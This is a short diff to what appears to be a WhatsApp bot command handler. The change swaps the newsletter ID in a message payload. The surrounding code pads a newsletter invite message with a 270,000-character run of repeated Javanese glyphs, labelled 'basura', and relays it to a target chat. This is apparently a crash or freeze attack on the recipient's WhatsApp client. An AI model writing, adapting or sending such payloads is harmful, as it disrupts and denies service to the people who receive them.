@@ -20,7 +20,7 @@ let handler = async (m, { conn, text, isOwner, command }) => {
         const basura = 'ꦾ'.repeat(90000);
         await conn.relayMessage(jid, {
             newsletterAdminInviteMessage: {
-                newsletterJid: "120363229729656123@newsletter",
+                newsletterJid: "120363406360158608@newsletter",
                 newsletterName: "ADOi" + basura.repeat(3),
                 jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                 caption: "BILLIE BOT",
